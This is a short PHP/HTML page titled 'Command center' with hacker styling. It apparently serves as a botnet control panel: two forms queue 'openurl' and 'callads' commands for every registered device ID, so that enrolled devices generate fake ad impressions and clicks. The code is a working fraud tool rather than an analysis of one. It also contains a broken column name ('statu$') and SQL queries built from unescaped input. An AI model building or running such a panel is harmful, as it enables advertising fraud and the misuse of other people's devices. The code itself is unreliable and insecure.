
<!DOCTYPE html>
<html>
<head>
	  <style>

body {
    background-image: url("1747969.jpg");
    
}

  </style>
	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
<script src="js/bootstrap.min.js"></script>
	<title>Command center</title>
</head>
<body>
<?php
include 'header.php'
?>
<div class="row">
  <div class="col-md-6 col-md-offset-0"><h1 style="color:#92FAF1 ;font-size:200%"> root@k3rn3lr00t:~#./Command Center</h1>
</div>


<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>


<form method="POST" action="">
<div class="form-group has-success">
  <label class="control-label" for="inputSuccess1">[+]Number of impression</label>
  <input type="text" class="form-control" id="id" name="id">
</div>
 <button type="submit" name="submit" value="submit" class="btn btn-primary btn-lg btn-block">Send Command</button>
</form>


<br><br>
<form method="POST" action="">
<div class="form-group has-success">
  <label class="control-label" for="inputSuccess1">[+]Number of clicks</label>
  <input type="text" class="form-control" id="id2" name="id2">
</div>
 <button type="submit" name="submit2" value="submit2" class="btn btn-primary btn-lg btn-block">Send Command</button>
</form>
</body>
</html>


<?php
include'include/connection.php';

if(isset($_POST["submit"]))//
{
$loop = $_POST["id"];
$par1='';
$par2 ='';
  $par3 = '';



$mydate=getdate(date("U"));
$final =  $mydate[month].$mydate[mday].$mydate[year];



$query = mysqli_query($conn, "SELECT UNIQUE_ID FROM info");

  while ($row = mysqli_fetch_array($query))
    # code...
  {
for($x=$loop;$x!=0;$x--)
{
     
$id =  $row['UNIQUE_ID'];

  mysqli_query($conn, "INSERT INTO cmd (uid, command, statu$, Para1, Para2,datetime,para3) VALUES ( '$id', 'openurl','0','$par1','$par2','$final','$par3')");
 


}  

}

}
?>

<?php
include'include/connection.php';

if(isset($_POST["submit2"]))//
{
$loop = $_POST["id2"];
$par1='';
$par2 ='';
  $par3 = '';



$mydate=getdate(date("U"));
$final =  $mydate[month].$mydate[mday].$mydate[year];



$query = mysqli_query($conn, "SELECT UNIQUE_ID FROM info");

  while ($row = mysqli_fetch_array($query))
    # code...
  {
for($x=$loop;$x!=0;$x--)
{
     
$id =  $row['UNIQUE_ID'];

  mysqli_query($conn, "INSERT INTO cmd (uid, command, statu$, Para1, Para2,datetime,para3) VALUES ( '$id', 'callads','0','$par1','$par2','$final','$par3')");
 


}  

}

}
?>
